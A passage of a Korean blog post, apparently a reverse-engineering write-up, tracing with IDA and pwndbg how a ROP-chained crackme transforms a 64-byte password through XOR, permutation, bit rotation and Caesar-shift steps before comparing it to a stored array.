&lt;h1 id=&quot;2-동적-디버깅&quot;&gt;2. 동적 디버깅&lt;/h1&gt;

&lt;h2 id=&quot;21-main-이후-실행되는-함수-sub_34d7&quot;&gt;2.1. main 이후 실행되는 함수: sub_34D7&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2011.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;일단 앞에서 찾았던 지점을 정리하고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password:&lt;/code&gt;를 출력하는 부분을 찾자.&lt;/p&gt;

&lt;p&gt;IDA에서 sub_34D7을 콜하는 지점으로 확인됐던 지점에 bp를 걸고 실행해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2012.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;저거 너무 string같은 포맷인데… 실제로 확인해 보니 스트링이 맞다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2013.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;저런 문자열을 보통 받는 함수가 있나? 그건 이후 찾아봐야 할 문제 같다.&lt;/p&gt;

&lt;p&gt;일단 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_34D7(”\177ELF\002\001\001\003”, “\177ELF\002\001\001”)&lt;/code&gt; 인 점은 체크해두자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2014.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이후 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_19C4(”\177ELF\002\001\001\003”, “\177ELF\002\001\001”)&lt;/code&gt; 를 한다.&lt;/p&gt;

&lt;h2 id=&quot;22-sub_19c4-내부에서-password-를-출력하는-부분-체크&quot;&gt;2.2. sub_19C4 내부에서 password: 를 출력하는 부분 체크&lt;/h2&gt;

&lt;p&gt;pwndbg 내부에는 특정 시스콜이 실행될 때 코드플로우를 멈춰 주는 기능이 있다.&lt;/p&gt;

&lt;p&gt;따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catch syscall write&lt;/code&gt; 옵션을 주고 프로그램을 실행시켜 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2015.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;전혀 상관 없는 함수 내부의 syscall 인스트럭션을 실행하는 부분에서 멈췄다. 현재 rsi에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input&lt;/code&gt; 이 들어가 있고, 아래 스택에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password:&lt;/code&gt; 가 들어가 있는 것을 보아 실제로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input password:&lt;/code&gt; 를 콘솔에 뿌려 주는 부분인 것이 맞는 것 같다.&lt;/p&gt;

&lt;p&gt;여기에서 rip가 멈춰 있는 함수는 vmmap으로 확인한 결과 기본 라이브러리 함수였다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2016.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아하! 그럼 주어진 바이너리는 rop를 이용해 만든 바이너리임을 추측할 수 있다. 원래 바이너리의 코드부가 아닌 멀쩡한 라이브러리 함수의 코드부에서도 특정 목적을 위한 인스트럭션으로 점프한 것을 그 근거로 들 수 있다. 또한 콜스택에 유의미한 콜러-콜리 정보가 없는 대신 스택에 가젯들이 들어가 있는 것을 그 그 근거로 들 수 있겠다.&lt;/p&gt;

&lt;p&gt;그럼 이제 해당 행위가 끝나고 리턴할 지점은 콜스택이 아니라 프로세스 스택에 저장되어 있을 것이다. 즉 pwndbg가 제공하는 backtrace로는 리턴할 callee를 찾아낼 수 없다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2017.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;따라서 스택을 분석해 보았다. 그 결과 알아낸 점은 아래와 같다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;사이에 2개 값들이 용처가 정확하지 않게 비어 있다. 이것들이 어떻게 되는지는 쭉 따라가면서 찾아봐야 할 텐데, 중간의 0xbeefbeefbeefbeef는 누가 봐도 바이너리에서 넣어 준 값 같다. 매우 특징적인 값이므로 따라가볼 만하다고 생각한다.
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;찾아보니, 정말로 바이너리에 있었다. 오프셋 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x202e&lt;/code&gt;에서 진행되는 행위였다.&lt;/p&gt;

        &lt;p&gt;해당 지점은 스택에 rop chain을 저장하는 기능에 포함되어 있었다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2018.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;사용자 입력값을 저장하는 버퍼로 0x55555555a800를 사용하고 있다. 디버거상에서 해당 메모리를 참조할 때마다 멈추도록 설정한 다음 프로그램을 돌리면 어떤 행위가 일어나는지, 그리고 그 행위는 어떤 함수에서 수행되는지 알 수 있을 것 같다.
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;행위 분석 및 함수 복원&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2019.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2020.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;bp가 트리거되었을 때 컨텍스트. 앞선 read/write를 끝내고 오프셋 0x1215로 돌아와 다른 행위를 하는데, 사용자 입력값이 저장된 버퍼에 어떤 행위를 했다.&lt;/p&gt;

        &lt;p&gt;어떤 행위를 했는지 IDA로 확인해 보니, 아래와 같았다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2021.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;사용자 입력값이 저장된 버퍼에 rax의 하위 32비트(al)을 저장했다.&lt;/p&gt;

        &lt;p&gt;해당 기능은 IDA기준 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1215&lt;/code&gt; 함수의 일부로 정의되어 있다. 해당 함수를 가상코드로 변환해 보면 영 이상하다. 어셈블리와 비교하며 올바른 루프문으로 바꿔주면 아래와 같다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2022.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;반복할 횟수를 a1으로 받아(아마 문자열의 길이일 것이고, 앞에서 봤던 스택을 생각하면 0x40일 것이다), 사용자 입력이 저장된 버퍼에 대해 a3와 xor연산을 한다.  a3는 전달받을 당시 edx로 전달되며 이후 버퍼에 저장된 첫 글자부터 xor되는 int값이다.  앞에서 봤던 스택과, 동적으로 디버깅했을 때 0x41과 xor된 값이 0x5라는 점을 감안하면 0x44가 인자로 주어지는 것 같다. 따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1215&lt;/code&gt;를 복원하면 아래와 같다.&lt;/p&gt;

        &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1215(0x40, char *buf, 0x44)&lt;/code&gt;: does xor every chars in user input with 0x44&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;또한 해당 바이너리의 코드 영역에 해당하는 주소가 중간에 2개 존재하는데, 이는 특정 행위를 마치고 코드 플로우가 돌아갈 부분을 의미하는 것 같다. 실제로 동적으로 디버깅해 보니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1215&lt;/code&gt; 이후 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1268&lt;/code&gt;이 실행됨을 확인할 수 있었다. 두 주소를 IDA에서 확인해 보니 아래와 같았다.
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;0x1215 함수는 이미 복원했으므로 0x1268만 다루겠다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2023.png&quot; alt=&quot;0x1268의 루틴&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;0x1268의 루틴&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2024.png&quot; alt=&quot;0x1268의 pseudo-code&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;0x1268의 pseudo-code&lt;/p&gt;

    &lt;p&gt;해당 함수가 실행되는 순간의 레지스터는 아래와 같았다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2025.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;즉 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1268(0xe5119cf0, 0xddc615f0, 0x7851327a, 0x84a7815a, char *buf)&lt;/code&gt;이다.&lt;/p&gt;

    &lt;p&gt;그렇다면 이 함수는 어떤 기능을 할까? 일단 사용자 인풋이 저장되는 주소인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x55555555a800&lt;/code&gt; 과는 아무런 상호작용이 없다는 점에서 입력과는 독립적인 무언가를 행하는 부분일 것이다.&lt;/p&gt;

    &lt;p&gt;아마 느낌상 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x55555555a900&lt;/code&gt;이 모종의 단계를 거쳐 변화한 값이 저장되는 부분일 것이고…&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2026.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;그리고 실제로도 맞는 것 같다. 그럼 대체 뭘 변화시킨 걸까?&lt;/p&gt;

    &lt;p&gt;사실 감이 안 온다. 그럼 일단 넘어가고, 다음에 실행되는 함수를 분석해 보자.&lt;/p&gt;

    &lt;p&gt;해당 함수를 총 3회 정도 추가로 수행하고 다음 함수로 넘어감을 확인했다. 그 때의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x55555555a900&lt;/code&gt; 은 다음과 같았다. (참고: 어떤 함수를 몇 번 수행할지는 스택을 보면 알 수 있다. ROP chaining을 통해 이미 스택에 코드 플로우가 다 들어가 있기 때문이다. 따라서 동적 디버깅을 할 때 왜 똑같은 함수로 들어가는 거지? 싶으면 스택을 보면 된다.)&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2027.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;23-sub_1447-분석&quot;&gt;2.3. sub_1447 분석&lt;/h2&gt;

&lt;p&gt;현재까지의 흐름은 아래와 같다..&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_34d7&lt;/code&gt; → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_19c4&lt;/code&gt;(rop chaining) → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1215&lt;/code&gt; → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1268&lt;/code&gt; * 4&lt;/p&gt;

&lt;p&gt;이후 실행되는 함수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1447&lt;/code&gt;이었다. 해당 함수의 기능을 알아보자.&lt;/p&gt;

&lt;p&gt;IDA 상에서는 함수로 인식되지 않기 때문에, 내가 직접 함수로 설정해줘야 한다. create function 기능을 이용해 함수로 만들어 주었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2028.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;해당 함수는 두 개의 인자를 받는데, 첫 번째가 user input이 저장된 부분이고 두 번째가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1268&lt;/code&gt;에서 만들어준 값이 저장된 부분이다. 여기에서 user input이 변화할 것임을 추측할 수 있다.&lt;/p&gt;

&lt;p&gt;또한 우리는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1268&lt;/code&gt;에서 모종의 값을 변화해 저장하면서 16바이트의 공간에 16회 접근한 것을 알고 있다. 즉, 1바이트를 배열의 한 인덱스에 저장되는 값으로 취급했음을 알고 있다. 이를 기반으로 IDA에서 출력해 주는 가상함수를 수정하면 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2029.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아하… sub_1268에서 만들어준 값 배열은 위치 지정자였음을 알 수 있다. 일종의 테이블 아닐까? SPN 네트워크 구조에서 보이는 Permutation 구조를 반영한 것 말이다. 즉 user input 내부의 순서를 마구 바꿔서 다시 user input에 저장하는… 그런 것 같다.&lt;/p&gt;

&lt;p&gt;따라서 나는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1447&lt;/code&gt;을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;after_password_3_Permutation_sub_1447&lt;/code&gt;로 네이밍했고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1268&lt;/code&gt;을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;after_password_2_making_permutation_table_sub_1268&lt;/code&gt;로 네이밍했다.&lt;/p&gt;

&lt;p&gt;sub_1447을 복원하면 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1447(char *buf, int8 *table)&lt;/code&gt;: Does Permutation on user input(buf)&lt;/p&gt;

&lt;p&gt;이제 다른 함수로 넘어가 보자. 그 전에, 이 함수를 총 몇 회 수행하는지 체크했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2030.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;총 4회 수행한다. (usr_input의 0~15, 16~31, 32~47, 48~63 인덱스에 대해 차례로 table의 첫 바이트부터 참고하여 permutation을 수행하는 것이라 어느 쪽으로 옮겨진 게 또 다른 쪽으로 옮겨질 수도 있다.)&lt;/p&gt;

&lt;h2 id=&quot;24-sub_14ed-분석&quot;&gt;2.4. sub_14ed 분석&lt;/h2&gt;

&lt;p&gt;현재까지의 흐름은 아래와 같다&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_34d7&lt;/code&gt; → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_19c4&lt;/code&gt;(rop chaining) → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1215&lt;/code&gt; → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1268&lt;/code&gt; * 4 → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1447&lt;/code&gt; *4&lt;/p&gt;

&lt;p&gt;이쯤에서 사용자 input은 어떻게 됐는지 보자. 아 그런데 나는 입력값을 알파벳 하나로 통일해서… permutation이 안 잡힐 것 같긴 하다….&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2031.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그리고 역시 안 잡혔다. 하지만 permutation이 진행된 것이다…!!!!!!&lt;/p&gt;

&lt;p&gt;음 입력값의 permutation이 더 확실히 잡히는 게 나을 것 같아 다른 값을 주고 재실행했다.&lt;/p&gt;

&lt;p&gt;입력값: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!&lt;/p&gt;

&lt;p&gt;sub_1447(permutation) 수행 전&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2032.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;sub_1447(permutation) 수행 마무리 후&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2033.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;IDA에서는 sub_14ed 또한 함수로 인식하지 못하므로 create function 해줬다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2034.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;여기에서 전달되는 두 개의 인자는 무엇인지 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2035.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;rsi로는 user input buffer의 시작주소가 들어가 있는 것을 확인했다.&lt;/p&gt;

&lt;p&gt;rdi에는 이전까지 보지 못했던 주소가 들어가 있다. 해당 주소에 뭐가 있는지 확인해 보니 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2036.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;user input에 영향을 받는 부분일까? 알고 싶어 다시 한 개 알파벳으로만 통일한 값을 줘 보았으나, 변동은 없었다. 이것도 모종의 테이블 같다. (0xa060은 오프셋 0x6060으로 정답값이 들어있는 64바이트 배열이다)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2037.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;어셈블리에서 1바이트 단위로 테이블에서 값을 가져와 xor 연산을 하고 있다는 점을 감안해 IDA의 가상함수를 수정하니 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2038.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;또 xor이다!&lt;/p&gt;

&lt;p&gt;즉 sub_14ed를 복원하면 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_14ed(char *table, char *buf)&lt;/code&gt; : table의 1 byte를 buf의 1byte와 xor해 buf에 저장한다.&lt;/p&gt;

&lt;h2 id=&quot;25-sub_15bb-분석&quot;&gt;2.5. sub_15bb 분석&lt;/h2&gt;

&lt;p&gt;혹시나 해서 다시 언급한다. 이 문제는 stack-based rop chaining으로, 다음에 무슨 함수가 실행될지는 스택을 쭉 펼쳐보면 알 수 있다. 동적으로 디버깅하는 코드 플로우와 스택을 비교해 가면서 지금 내가 맞는 위치에 있는지 꼭 확인하자!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2039.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;어셈블리까지 감안해 보았을 때, 해당 함수에 전달되는 파라미터는 하나로, user input이 저장된 buf의 시작주소인 것 같다.&lt;/p&gt;

&lt;p&gt;그리고 가상코드로 변환한 IDA의 코드를 보면 다음과 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2040.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;buf에서 4k, 4k+1, 4k+2, 4k+3 (k=0, 1, … , 15) 번째의 원소별로 다른 알고리즘을 적용해 변환한다. 즉 substitution 연산을 한다.&lt;/p&gt;

&lt;p&gt;이제 callee들을 분석해 보자.&lt;/p&gt;

&lt;h3 id=&quot;251-sub_1545-for-4k-4k2-elements&quot;&gt;2.5.1. sub_1545 (for 4k, 4k+2 elements)&lt;/h3&gt;

&lt;p&gt;전달되는 인자들의 type을 감안해 해당 함수에서 사용되는 파라미터들의 type을 수정해 주었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2041.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;숫자 8을 기준으로 대칭이 되는 pair로 좌, 우에 대해 각각 시프트 연산을 한다는 의미는 다음과 같다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;시프트 연산 대상의 자료형이 8bits 크기를 가진다.&lt;/p&gt;

    &lt;p&gt;→ 즉, 이 크기를 넘어가게 시프트를 시켜버리면 데이터가 완전히 소실된다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;좌, 우에 대해 각각 x, y 비트만큼을 시프트시킬 때 x+y=8이고, 그 둘을 or 연산 한다.&lt;/p&gt;

    &lt;p&gt;→ or 연산의 의미는 데이터를 최대한 보존하겠다는 것이다.&lt;/p&gt;

    &lt;p&gt;→ 이는 좌로 x비트 순환 시프트 연산(==우로 y비트 순환 시프트 연산)을 시키겠다는 뜻이다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;결론: 해당 함수는 우로 a2비트 순환 시프트 연산을 수행하는 함수다.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;252-sub_1580-for-4k1-4k3-elements&quot;&gt;2.5.2 sub_1580 (for 4k+1, 4k+3 elements)&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2042.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;좌로 a2비트 순환 시프트 연산을 수행하는 함수다.&lt;/p&gt;

&lt;p&gt;이제 분석이 끝났으니, 해당 함수의 끝에 bp를 걸고 다음 함수로 넘어가 보자.&lt;/p&gt;

&lt;h2 id=&quot;26-sub_16e0-분석&quot;&gt;2.6. sub_16e0 분석&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2043.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;여기에서 IDA로 뺀 가상함수는 알아보기 힘들기 때문에 참고해서 재구성해야 한다.&lt;/p&gt;

&lt;p&gt;해당 함수에 진입하기 전에 수행된 함수가 epilogue를 수행한 직후의 스택을 확인하자(stack-based rop chaining이므로 전달되는 파라미터가 const인지 확인하려면 스택을 봐야 한다)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2044.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;pop rsi를 통해 함수의 두 번째 인자로 전달될 값이 무조건 고정임을 확인했다. (offset이 0x0011이고, 이후 이것의 하위 1바이트를 사용하므로)&lt;/p&gt;

&lt;p&gt;또한 어셈블리를 보고 함수를 재구성한 결과 복원된 함수는 아래와 같음을 확인했다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;sub_16e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// x==0x11&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;즉 카이사르 치환 암호화를 적용했다.&lt;/p&gt;

&lt;h2 id=&quot;27-sub_172e-분석&quot;&gt;2.7. sub_172e 분석&lt;/h2&gt;

&lt;p&gt;그 다음에 실행되는 함수는 sub_172e였다. 해당 함수 프롤로그 실행될 당시의 context를 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2045.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;어셈블리로부터 인자가 단 하나만 들어갔고, 그 인자는 user_input의 시작 주소임을 알 수 있다.&lt;/p&gt;

&lt;p&gt;이제 IDA로 디스어셈블한 코드를 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2046.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;굳이 더 부연하지 않고 넘어가야겠다. 중요한 건 이걸 복호화하는 코드를 만드는 일이고, 그를 위해서는 해당 연산에 xor만이 사용되었다, 즉 xor로 간단히 복호화 가능하다는 점만이 중요하기 때문이다.&lt;/p&gt;

&lt;h2 id=&quot;28-sub_193c-분석&quot;&gt;2.8. sub_193c 분석&lt;/h2&gt;

&lt;p&gt;여기는 사용자의 입력이 정답이 아닐 경우 nop :( 를 출력해 주는 함수다. 해당 함수가 수행되기 직전의 스택 상태를 보면 다음과 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2047.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그리고 sub_193c의 내용은 다음과 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2048.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

